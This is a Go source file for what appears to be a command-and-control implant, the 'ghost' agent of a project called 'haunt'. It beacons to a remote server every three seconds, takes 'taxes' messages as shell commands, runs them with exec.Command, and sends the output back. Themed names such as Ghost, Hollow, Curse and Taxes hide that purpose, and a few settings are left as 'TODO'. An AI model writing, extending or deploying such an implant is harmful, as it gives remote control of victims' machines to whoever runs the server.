package ghost

import (
	"encoding/json"
	"io"
	"os/exec"
	"strings"
	"time"

	whisp "github.com/patbcole117/haunt/whispers"
)

var (
	GHOST_SLEEP_TIME	= 3 * time.Second
	GHOST_TAXES_LIMIT 	= 10
	GHOST_ENDS_LIMIT 	= 10
	GHOST_CMD_PATH		= "TODO"
	GHOST_CMD_ENV		= "TODO"
	GHOST_CMD_WAIT		= "TODO"
)

type Ghost struct {
	Hollow 	string
	Ends 	chan whisp.Curse
	Taxes	chan whisp.Curse
	Voice 	whisp.Whisperer
}

func NewGhost(hollow, proto string) (*Ghost) {
	return &Ghost{
		Hollow: proto + "://" + hollow + "/",
		Ends: make(chan whisp.Curse, GHOST_ENDS_LIMIT),
		Taxes: make(chan whisp.Curse, GHOST_TAXES_LIMIT),
		Voice: whisp.NewWhisperer(proto),
	}
}

func (g *Ghost) DoTaxes() {
	for c := range g.Taxes {
		var out strings.Builder
		args := strings.Split(c.Content, " ")
		cmd := exec.Command(args[0], args[1:]...)
		cmd.Stdout = &out
		cmd.Stderr = &out
		if err := cmd.Run(); err != nil {
			c := whisp.NewCurse(whisp.CURSE_TYPE_ERROR)
			c.Content = err.Error()
			g.Ends <- c
		}
		c = whisp.NewCurse(whisp.CURSE_TYPE_TAXES_PAID)
		c.Content = out.String()
		g.Ends <- c
	}
}

func (g *Ghost) Haunt() {
	go g.DoTaxes()
	for {
		g.SayHello()
		time.Sleep(GHOST_SLEEP_TIME)
	}
}

func (g *Ghost) SayHello() {
	var c whisp.Curse
	if len(g.Ends) > 0 {
		c = <- g.Ends
	} else {
		c = whisp.NewCurse(whisp.CURSE_TYPE_HELLO)
	}
	
	// send hello
	res, err := g.Voice.WhisperJSON(g.Hollow, c)
	if err != nil {
		c.Type = whisp.CURSE_TYPE_ERROR
		c.Content = err.Error()
		g.Ends <- c
		return
	}
	
	// parse new curse
	body, err := io.ReadAll(res.Body)
	if err != nil {
		c.Type = whisp.CURSE_TYPE_ERROR
		c.Content = err.Error()
		g.Ends <- c
		return
	}
	
	if err = json.Unmarshal(body, &c); err != nil {
		c.Type = whisp.CURSE_TYPE_ERROR
		c.Content = err.Error()
		g.Ends <- c
		return
	}

	if c.Type == whisp.CURSE_TYPE_TAXES {
		g.Taxes <- c
	}
}
